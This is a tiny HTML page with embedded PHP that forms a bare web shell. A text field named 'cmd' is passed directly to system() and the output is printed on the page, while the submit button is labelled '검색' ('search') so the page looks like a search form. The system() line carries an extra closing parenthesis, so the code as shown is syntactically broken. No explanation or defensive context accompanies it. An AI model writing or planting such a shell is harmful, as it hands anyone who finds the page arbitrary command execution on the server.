<html>
  <body>
    <form method="GET">
      <input type="TEXT" name="cmd" size="70">

      <input type="SUBMIT" value="검색">
    </form>
    <pre>
      <?php
        if(isset($_GET['cmd']))
        {
          system($_GET['cmd']));
        }
      ?>
    </pre>
  </body>
</html>
